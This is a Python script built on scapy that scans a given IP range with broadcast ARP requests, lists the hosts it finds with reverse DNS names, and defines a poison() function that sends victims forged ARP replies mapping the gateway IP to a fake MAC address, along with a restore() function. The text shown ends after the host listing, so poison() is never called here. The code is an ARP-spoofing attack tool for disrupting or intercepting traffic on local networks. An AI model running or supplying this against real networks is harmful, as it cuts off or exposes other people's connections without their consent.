
import sys
import datetime
import optparse
from scapy.all import *

# function to parse command line args
def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-r", "--range", dest="range", 
		help="Target IP / IP range.")
	options, arguments = parser.parse_args()
	return options

def poison(victim_ip, victim_mac, gateway_ip):
	# Send the victim an ARP packet pairing the gateway ip with the wrong
	# mac address
	packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
	send(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
	# Send the victim an ARP packet pairing the gateway ip with the correct
	# mac address
	packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
	send(packet, verbose=0)

# carefully craft ARP ping packet with datalink access
options = get_arguments()
ip_address = options.range
arp_header = ARP(pdst=ip_address)
ether_header = Ether(dst="ff:ff:ff:ff:ff:ff")

try:
	# send the ARP ping packt crafted above
	print("\nBroadcasting packet...")
	answers = srp(ether_header/arp_header, timeout=1, verbose=False)[0]

except KeyboardInterrupt as interrupt:
	print("Quitting...")
	sys.exit(0) # quit and raise no error

# collect list of clients from answers
counter = -1
client_list = []
gateway_ip = ''; gateway_mac = '';
print("List of clients obtained: ")
for element in answers:
	counter += 1

	# attempt a reverse DNS lookup
	client_name = ''
	try:
		client_name = socket.gethostbyaddr(element[1].psrc)[0]

	except (socket.error, Exception) as error:
		client_name = "UNKNOWN"

	client_list.append([element[1].psrc, element[1].hwsrc])

	print("%i) %s - %s - %s" % (
		counter, element[1].psrc, element[1].hwsrc,
		client_name))


